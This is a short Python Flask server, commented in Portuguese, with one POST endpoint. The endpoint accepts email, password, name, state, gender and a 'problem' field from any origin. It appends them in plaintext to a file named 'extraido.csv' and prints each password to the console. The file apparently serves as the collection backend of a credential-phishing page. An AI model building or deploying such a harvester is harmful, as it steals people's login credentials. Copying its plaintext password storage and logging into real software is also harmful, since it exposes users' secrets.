import os
import csv
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
OUTPUT_FILE = "extraido.csv"  # Nome do arquivo de saída

# Definição das colunas para o CSV
CSV_COLUMNS = ["Email", "Senha", "Nome", "Estado", "Gênero", "Problema"]

# Verifica se o arquivo já existe, se não, cria com cabeçalho
if not os.path.exists(OUTPUT_FILE):
    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(CSV_COLUMNS)  # Escreve o cabeçalho

@app.route('/informacao', methods=['POST'])
def receber_dados():
    data = request.get_json()

    # Verifica se os campos existem antes de acessá-los
    if not all(key in data for key in ["email", "senha", "nome", "estado", "genero", "problema"]):
        return jsonify({"erro": "Campos ausentes no JSON"}), 400

    # Processa os dados recebidos
    email = data['email']
    senha = data['senha']
    nome = data['nome']
    estado = data['estado']
    genero = data['genero']
    problema = data['problema']

    print(f"Recebido: {data}")  
    # Abre o arquivo para escrita no modo append
    with open(OUTPUT_FILE, 'a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow([email, senha, nome, estado, genero, problema])  # Adiciona os dados

    print(f"-=-=-=->> {email}")
    print(f"-=-=-=->> {senha}")
    print(f"-=-=-=->> {nome}")
    print(f"-=-=-=->> {estado}")
    print(f"-=-=-=->> {genero}")
    print(f"-=-=-=->> {problema}")

    return jsonify({"mensagem": "Dados salvos com sucesso!"}), 200

if __name__ == '__main__':  
    app.run(host="10.0.0.179", port=5000, debug=False)
